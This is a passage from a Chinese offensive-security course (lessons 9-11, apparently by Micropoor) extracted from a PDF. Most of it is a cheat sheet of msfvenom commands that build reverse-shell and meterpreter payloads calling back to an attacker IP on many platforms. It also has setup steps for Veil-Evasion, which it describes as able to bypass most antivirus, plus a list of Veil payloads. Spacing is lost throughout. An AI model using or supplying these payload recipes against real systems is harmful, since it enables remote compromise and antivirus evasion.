//打开软件
1. meterpreter>getuid
2. Serverusername:John-PC\John
第九课：工具介绍-the-backdoor-factory
-102-
本文档使用书栈(BookStack.CN)构建
//确定目标
—ByMicropoor
第九课：工具介绍-the-backdoor-factory
-103-
本文档使用书栈(BookStack.CN)构建
1. msfvenom-ax86--platformWindows-pwindows/meterpreter/reverse_tcp
2. LHOST=攻击机IPLPORT=攻击机端口-ex86/shikata_ga_nai-b'\x00\x0a\xff'-i3-f
exe-opayload.exe
1. msfvenom-ax86--platformosx-posx/x86/shell_reverse_tcpLHOST=攻击机IP
LPORT=攻击机端口-fmacho-opayload.macho
1. //需要签名
2. msfvenom-ax86--platformAndroid-pandroid/meterpreter/reverse_tcpLHOST=攻
击机IPLPORT=攻击机端口-fapk-opayload.apk
1. msfvenom-ax86--platformWindows-pwindows/powershell_reverse_tcpLHOST=攻击
机IPLPORT=攻击机端口-ecmd/powershell_base64-i3-fraw-opayload.ps1
1. msfvenom-ax86--platformLinux-plinux/x86/meterpreter/reverse_tcpLHOST=攻
击机IPLPORT=攻击机端口-felf-opayload.elf
1. msfvenom-pphp/meterpreter_reverse_tcpLHOST=LPORT=-fraw>shell.php
2. catshell.php|pbcopy&&echo'shell.php&&pbpaste>>
shell.php
msfvenom常用生成Payload命令
windows:
mac:
android:
powershell:
linux:
php:
第十课：msfvenom常用生成payload命令
-104-
本文档使用书栈(BookStack.CN)构建
1. msfvenom-ax86--platformwindows-pwindows/meterpreter/reverse_tcpLHOST=攻
击机IPLPORT=攻击机端口-faspx-opayload.aspx
1. msfvenom--platformjava-pjava/jsp_shell_reverse_tcpLHOST=攻击机IPLPORT=攻击
机端口-fraw-opayload.jsp
1. msfvenom-pjava/jsp_shell_reverse_tcpLHOST=攻击机IPLPORT=攻击机端口-fraw-o
payload.war
1. msfvenom-pnodejs/shell_reverse_tcpLHOST=攻击机IPLPORT=攻击机端口-fraw-o
payload.js
1. msfvenom-ppython/meterpreter/reverse_tcpLHOST=攻击机IPLPORT=攻击机端口-fraw
-opayload.py
1. msfvenom-pcmd/unix/reverse_perlLHOST=攻击机IPLPORT=攻击机端口-fraw-o
payload.pl
1. msfvenom-pruby/shell_reverse_tcpLHOST=攻击机IPLPORT=攻击机端口-fraw-o
payload.rb
aspx:
jsp:
war:
nodejs:
python:
perl:
ruby:
lua:
第十课：msfvenom常用生成payload命令
-105-
本文档使用书栈(BookStack.CN)构建
1. msfvenom-pcmd/unix/reverse_luaLHOST=攻击机IPLPORT=攻击机端口-fraw-o
payload.lua
1. msfvenom-ax86--platformWindows-pwindows/meterpreter/reverse_tcpLHOST=攻
击机IPLPORT=攻击机端口-fc
1. msfvenom-ax86--platformLinux-plinux/x86/meterpreter/reverse_tcpLHOST=攻
击机IPLPORT=攻击机端口-fc
1. msfvenom-ax86--platformosx-posx/x86/shell_reverse_tcpLHOST=攻击机IP
LPORT=攻击机端口-fc
项目地址：
https://github.com/Screetsec/TheFatRat
1. root@John:~/Desktop#gitclonehttps://github.com/Screetsec/TheFatRat.git
2. //设置时需要挂墙
windowsshellcode:
linuxshellcode:
macshellcode:
便捷化payload生成：
第十课：msfvenom常用生成payload命令
-106-
本文档使用书栈(BookStack.CN)构建
第十课：msfvenom常用生成payload命令
-107-
本文档使用书栈(BookStack.CN)构建
中文使用说明：
1. Options:
2.
3. -p,--payload使用指定的payload
4. --payload-options列出该payload参数
5. -l,--list[type]列出所有的payloads
6. -n,--nopsled为payload指定一个nopsled长度
7. -f,--format指定payload生成格式
8. --help-formats查看所有支持格式
9. -e,--encoder使用编码器
10. -a,--arch指定payload构架
11. --platform指定payload平台
12. --help-platforms显示支持的平台
13. -s,--space设定payload攻击荷载的最大长度
14. --encoder-spaceThemaximumsizeoftheencodedpayload
15.
16. (defaultstothe-svalue)
17. -b,--bad-chars指定bad-chars如:'\x00\xff'
18. -i,--iterations指定编码次数
19. -c,--add-code指定个win32shellcode文件
20. -x,--template指定一个executable文件作为模板
21. -k,--keeppayload自动分离并注入到新的进程
22. -o,--out存放生成的payload
23. -v,--var-name指定自定义变量
24. --smallestGeneratethesmallestpossiblepayload
25. -h,--help显示帮助文件
—ByMicropoor
附录：
第十课：msfvenom常用生成payload命令
-108-
本文档使用书栈(BookStack.CN)构建
项目地址：
https://github.com/Veil-Framework/Veil-Evasion
Veil-Evasion是与Metasploit生成相兼容的Payload的一款辅助框架，并可以绕过大多数的
杀软。
Veil-Evasion并没有集成在kali，配置sources.list，可直接apt-get。
1. root@John:~/Deskto#cat/etc/apt/sources.list
2.
3. #中科大
4. debhttp://mirrors.ustc.edu.cn/kalikali-rollingmainnon-freecontrib
5. deb-srchttp://mirrors.ustc.edu.cn/kalikali-rollingmainnon-freecontrib
6. #阿里云
7. #debhttp://mirrors.aliyun.com/kalikali-rollingmainnon-freecontrib
8. #deb-srchttp://mirrors.aliyun.com/kalikali-rollingmainnon-freecontrib
9. #清华大学
10. #debhttp://mirrors.tuna.tsinghua.edu.cn/kalikali-rollingmaincontribnon-
free
11. #deb-srchttps://mirrors.tuna.tsinghua.edu.cn/kalikali-rollingmaincontrib
non-free
12. #浙大
13. #debhttp://mirrors.zju.edu.cn/kalikali-rollingmaincontribnon-free
14. #deb-srchttp://mirrors.zju.edu.cn/kalikali-rollingmaincontribnon-free
15. #东软大学
16. #debhttp://mirrors.neusoft.edu.cn/kalikali-rolling/mainnon-freecontrib
17. #deb-srchttp://mirrors.neusoft.edu.cn/kalikali-rolling/mainnon-freecontrib
18. #官方源
19. debhttp://http.kali.org/kalikali-rollingmainnon-freecontrib
20. deb-srchttp://http.kali.org/kalikali-rollingmainnon-freecontrib
21. #重庆大学
22. #debhttp://http.kali.org/kalikali-rollingmainnon-freecontrib
23. #deb-srchttp://http.kali.org/kalikali-rollingmainnon-freecontrib
工具介绍Veil-Evasion
1、Veil-Evasion
2、安装
第十一课：工具介绍Veil-Evasion
-109-
本文档使用书栈(BookStack.CN)构建
1. root@John:~/Desktop#apt-getinstallveil-evasion
由于在实验中本机已经安装，所以我们在虚拟机中使用git方式来下载和安装。（以便截图）
ps:本次kali下截图使用scrot
1. root@John:~/Deskto#apt-getinstallscrot
2. root@John:~/Deskto#scrot-s//即可
3. root@John:~/Deskto#gitclonehttps://github.com/Veil-Framework/Veil-
Evasion.git
1. root@John:~/Veil-Evasion#./setup.sh
2. //安装漫长
第十一课：工具介绍Veil-Evasion
-110-
本文档使用书栈(BookStack.CN)构建
第十一课：工具介绍Veil-Evasion
-111-
本文档使用书栈(BookStack.CN)构建
以 c/meterpreter/rev_tcp 为例：
3、测试
第十一课：工具介绍Veil-Evasion
-112-
本文档使用书栈(BookStack.CN)构建
ps:Veil-Evasion不再更新，新版本项目地址：
https://github.com/Veil-Framework/Veil
4、附录：
第十一课：工具介绍Veil-Evasion
-113-
本文档使用书栈(BookStack.CN)构建
1. [*]可支持生成payloads:
2. 1)auxiliary/coldwar_wrapper
3. 2)auxiliary/macro_converter
4. 3)auxiliary/pyinstaller_wrapper
5. 4)c/meterpreter/rev_http
6. 5)c/meterpreter/rev_http_service
7. 6)c/meterpreter/rev_tcp
8. 7)c/meterpreter/rev_tcp_service
9. 8)c/shellcode_inject/flatc
10. 9)cs/meterpreter/rev_http
11. 10)cs/meterpreter/rev_https
12. 11)cs/meterpreter/rev_tcp
13. 12)cs/shellcode_inject/base64_substitution
14. 13)cs/shellcode_inject/virtual
15. 14)go/meterpreter/rev_http
16. 15)go/meterpreter/rev_https
17. 16)go/meterpreter/rev_tcp
18. 17)go/shellcode_inject/virtual
19. 18)native/backdoor_factory
20. 19)native/hyperion
21. 20)native/pe_scrambler
22. 21)perl/shellcode_inject/flat
23. 22)powershell/meterpreter/rev_http
24. 23)powershell/meterpreter/rev_https
25. 24)powershell/meterpreter/rev_tcp
26. 25)powershell/shellcode_inject/download_virtual
27. 26)powershell/shellcode_inject/download_virtual_https
28. 27)powershell/shellcode_inject/psexec_virtual
29. 28)powershell/shellcode_inject/virtual
30. 29)python/meterpreter/bind_tcp
31. 30)python/meterpreter/rev_http
32. 31)python/meterpreter/rev_http_contained
33. 32)python/meterpreter/rev_https
34. 33)python/meterpreter/rev_https_contained
35. 34)python/meterpreter/rev_tcp
36. 35)python/shellcode_inject/aes_encrypt
37. 36)python/shellcode_inject/aes_encrypt_HTTPKEY_Request
38. 37)python/shellcode_inject/arc_encrypt
39. 38)python/shellcode_inject/base64_substitution
40. 39)python/shellcode_inject/des_encrypt
41. 40)python/shellcode_inject/download_inject
42. 41)python/shellcode_inject/flat
第十一课：工具介绍Veil-Evasion
-114-
本文档使用书栈(BookStack.CN)构建
43. 42)python/shellcode_inject/letter_substitution
44. 43)python/shellcode_inject/pidinject
45. 44)python/shellcode_inject/stallion
46. 45)ruby/meterpreter/rev_http
47. 46)ruby/meterpreter/rev_http_contained
48. 47)ruby/meterpreter/rev_https
49. 48)ruby/meterpreter/rev_https_contained
50. 49)ruby/meterpreter/rev_tcp
51. 50)ruby/shellcode_inject/base64
52. 51)ruby/shellcode_inject/flat
—ByMicropoor
第十一课：工具介绍Veil-Evasion
-115-
本文档使用书栈(BookStack.CN)构建
UDP（UserDatagramProtocol）是一种无连接的协议，在第四层-传输层，处于IP协议的上一
层。UDP有不提供数据包分组、组装和不能对数据包进行排序的缺点，也就是说，当报文发送之后，是
无法得知其是否安全完整到达的。
1. UDP缺乏可靠性。UDP本身不提供确认，超时重传等机制。UDP数据报可能在网络中被复制，
被重新排序，也不保证每个数据报只到达一次。
2. UDP数据报是有长度的。每个UDP数据报都有长度，如果一个数据报正确地到达目的地，那么
该数据报的长度将随数据一起传递给接收方。而TCP是一个字节流协议，没有任何（协议上
的）记录边界。